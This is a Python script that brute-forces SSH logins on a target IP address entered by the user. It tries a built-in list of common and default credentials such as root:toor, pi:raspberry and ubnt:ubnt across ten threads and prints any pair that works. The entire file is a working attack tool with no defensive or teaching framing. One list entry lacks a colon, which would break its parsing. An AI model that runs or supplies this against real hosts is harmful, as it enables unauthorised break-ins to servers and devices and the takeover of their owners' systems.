import paramiko
import concurrent.futures
import socket

# List of credentials in username:password format
credentials = [
    "root:root", "root:toor", "root:admin", "root:1234", "root:maxided", "root:pi", 
    "root:alpine", "root:r00tnull3d", "root:r00tnull3d#", "root:rootnull3d#", 
    "root:password", "root:centos6svm", "root:1234", "root:123456", "root:Love2020", 
    "root:Zero", "root:Password", "root:qwerty", "root:dragon", "root:pussy", 
    "root:baseball", "root:football", "root:monkey", "root:696969", "root:abc123", 
    "admin:admin", "admin:1234", "admin:Guest", "ubnt:ubnt", "guest:guest", 
    "user:user", "test:test", "pi:raspberry", "vagrant:vagrant", "localhost:root", 
    "B1NARY:B1NARY", "tim:tim", "CISCO:CISCO", "netgear", "support:support", 
    "oracle:oracle", "cusadmin:password"
]

# Function to attempt SSH login with given username, password, and target IP
def attempt_login(username, password, target_ip):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Auto-accept the host key

    try:
        ssh.connect(target_ip, username=username, password=password, timeout=5)
        print(f"[+] Success: {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
        return False
    except (socket.timeout, paramiko.SSHException) as e:
        print(f"[!] Error or timeout with {username}:{password} - {e}")
        return False

# Get the target IP address from the user
target_ip = input("Enter the IP address to SSH into: ")

# Function to handle the brute-force attack
def brute_force_ssh(target_ip):
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_cred = {
            executor.submit(attempt_login, cred.split(':')[0], cred.split(':')[1], target_ip): cred
            for cred in credentials
        }

        for future in concurrent.futures.as_completed(future_to_cred):
            if future.result():  # If a login attempt is successful
                executor.shutdown(wait=False)  # Immediately stop other threads
                break

# Main program logic
if __name__ == "__main__":
    brute_force_ssh(target_ip)
    print("Brute-force attempt complete.")
